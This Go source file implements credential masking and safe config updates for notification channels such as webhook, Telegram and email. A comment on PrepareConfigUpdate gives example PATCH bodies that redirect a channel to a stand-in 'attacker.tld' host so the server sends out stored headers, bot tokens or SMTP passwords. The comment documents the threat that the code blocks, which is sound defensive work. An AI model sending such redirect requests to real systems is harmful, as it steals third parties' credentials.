package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes credentials it replaces the real content with a value carrying this prefix,
// and when the update endpoint receives a value with this prefix it understands it as "keep the original value in the DB unchanged".
//
// A prefix is used instead of an empty string or a fixed constant so it can carry a little identifying information
// (see MaskedValue), letting users tell "which bot this is" without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              original too short, no hint given
//	"__masked__:…ab12cd"      carries the last 6 characters of the original as an identifying hint
//
// Exposing only the last 6 characters is deliberate: a Webhook URL's identifying information is at the end (e.g. the WeCom key,
// the Feishu bot id), while the prefix is the same for every bot and has no identifying value. The last 6 characters are not enough to
// recover the credential, but enough for the person configuring it to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unchanged since the API echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by masked values.
//
// Unknown channel types return an empty map rather than the original config — better to have the UI show "config unavailable"
// than to spit back raw content that may contain credentials when the channel type is unrecognized.
// Non-credential fields are kept as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential as a whole: judging each sub-key would require every channel
		// to declare yet another set of "which sub-keys are credentials" rules, with complexity far exceeding the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed, but the caller did not take a position on
// the credential fields". It is returned instead of silently allowing or silently dropping the credentials; see PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly addressed
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please also re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter new values, or explicitly leave them empty to indicate credentials are no longer needed. " +
		"The original credentials are only valid for the old address; keeping them would hand them to the new address."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of a "destination address change".
//
// It replaces bare MergeConfig on the channel update path, closing this practically exploitable path:
// the destination address (where messages go) and the credentials (what identity sends them) are two independent sets of fields, and MergeConfig
// always keeps the DB value for "keys not mentioned". So anyone who can PATCH a channel only needs to **change just the address
// and say nothing about the credentials** to make the server send the real credentials in the DB to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → original Authorization header sent out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over username and password after STARTTLS
//
// This path is completely silent and doesn't rely on redirects (so refusing cross-host redirects doesn't stop it),
// and it directly defeats the purpose of this package's masking mechanism — "credentials are never echoed to the browser".
//
// Rule: whenever a destination key is changed to a new value, the caller must explicitly address **every** credential key:
//   - provide a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential (keeps the clearing semantics)
//   - echo the masked value back / omit the key entirely → rejected
//
// The third case is also rejected because the meaning of a "masked value" is precisely "keep the old credential", and the old credential
// is only valid for the old address. We deliberately don't "automatically drop the credential" here — for optional credential fields
// (webhook headers, email password) that would silently become "auth is gone but the API returns 200",
// which is harder to troubleshoot than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook headers is an object) has a masked literal embedded in it,
	// the caller stuffed the "keep original value" sentinel inside a structure. MergeConfig only recognizes "a string
	// with the prefix" as masked, so this shape would be stored as an ordinary object — the DB really ends up with the literal
	// "__masked__", and later auth silently fails with no error at all. Better to reject it.
	//
	// This check must come **first**: when the address is unchanged we return early, so putting it later would mean
	// covering only the "address changed" path (the first version had it in the wrong place, and the tests caught it right away).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that actually changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: do a normal merge (masked values keep the original, empty strings clear, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require every credential key to be explicitly addressed.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the mask sentinel inside a non-string structure.
//
// The masking mechanism assumes "the whole value is a string". Object fields like webhook headers
// can only be masked as a whole (written as the string "__masked__") or submitted as a whole; stuffing the sentinel inside an object
// can neither express "keep unchanged" nor avoid being stored in the DB as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field can only be left empty as a whole to keep the existing value, or submitted as a whole with a new value; mask placeholders cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. JSON serialization is used for comparison to also handle
// type differences — the port submitted by the frontend is a number while the one read back from the DB is float64, so a direct == would misjudge.
//
// "Empty" must be normalized before comparing: an empty string and "key absent" are the same state in this config model,
// because MergeConfig treats an empty string as an explicit clear and deletes the key. Without normalization, an
// optional destination field that is always left empty (Telegram's base_url is the only such field: empty means use
// the official address) would go down this path —
//
//	created with base_url:""  →  first save deletes the key via MergeConfig
//	→ on the second save incoming is "" and stored lacks the key, judged as "address changed"
//	→ credentials are masked values → 400 "destination address has changed, please also re-enter the credential fields"
//
// From then on every save fails unless the user re-pastes the Bot Token, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "empty".
// The criterion must match MergeConfig's clearing check (strings.TrimSpace(s) == ""),
// otherwise there would be a gap where "MergeConfig thinks it should be deleted, sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating channel config.
//
// Rules:
//   - keys in incoming with a masked value → keep the stored original (the user didn't change this field)
//   - keys in incoming with an empty string → treated as an explicit clear, the key is deleted
//   - other keys → overwritten with the incoming value
//   - keys in stored but not in incoming → kept (partial update semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the frontend form submits unfilled fields as empty strings,
// and writing that as a valid value would really clear fields that were "left empty to keep the original value".
// We choose explicit clearing here, because when clearing a misconfigured field the user has no other way to express it
// (dropping the field could distinguish "not provided" from "provided empty", but the UI doesn't use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
